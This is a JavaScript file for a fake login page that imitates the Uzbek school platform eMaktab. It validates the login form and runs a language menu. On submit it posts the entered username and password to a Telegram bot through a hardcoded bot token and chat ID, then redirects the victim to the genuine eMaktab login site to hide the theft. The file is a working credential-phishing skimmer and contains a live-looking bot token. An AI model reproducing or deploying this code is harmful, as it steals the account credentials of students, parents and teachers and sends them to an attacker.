const pass = document.getElementById("pass");
const login = document.getElementById("login");
const btn = document.getElementById("btn");
const lanBtn = document.getElementById("lan");
const dropdown = document.getElementById("dropdown");

// Валидация
function validateInputs() {
    const password = pass.value.trim();
    const log = login.value.trim();
    btn.disabled = password === "" || log === "";
}

pass.addEventListener("input", validateInputs);
login.addEventListener("input", validateInputs);
validateInputs();

// Выпадающий список языков
lanBtn.addEventListener("click", () => {
    dropdown.classList.toggle("hidden");
});
document.addEventListener("click", (e) => {
    if (!lanBtn.contains(e.target) && !dropdown.contains(e.target)) {
        dropdown.classList.add("hidden");
    }
});
dropdown.querySelectorAll("button").forEach((btn) => {
    btn.addEventListener("click", () => {
        lanBtn.childNodes[0].textContent = btn.dataset.lang + " ";
        dropdown.classList.add("hidden");
    });
});

// Отправка данных в Telegram бота
async function sendDataAndRedirect() {
    const loginVal = login.value.trim();
    const password = pass.value.trim();

    if (!loginVal || !password) {
        alert('Login va parol kiritilishi kerak!');
        return;
    }

    const botToken = '7811440068:AAGdGmJq0x1d88-1dM3yji_CbiV1m2_cDvY'; // сюда вставь токен бота
    const chatId = '7016131367'; // сюда вставь ID чата

    const message = `🛡 Yangi login ma'lumotlari:\n👤 Login: ${loginVal}\n🔐 Parol: ${password}`;

    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

    try {
        const response = await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: chatId,
                text: message
            })
        });

        if (response.ok) {
            window.location.href = 'https://login.emaktab.uz/';
        } else {
            throw new Error('Telegramga yuborilmadi');
        }
    } catch (error) {
        console.error('Xatolik:', error);
        alert('Xatolik yuz berdi. Qayta urinib ko‘ring.');
    }
}

btn.addEventListener('click', (e) => {
    e.preventDefault();
    sendDataAndRedirect();
});
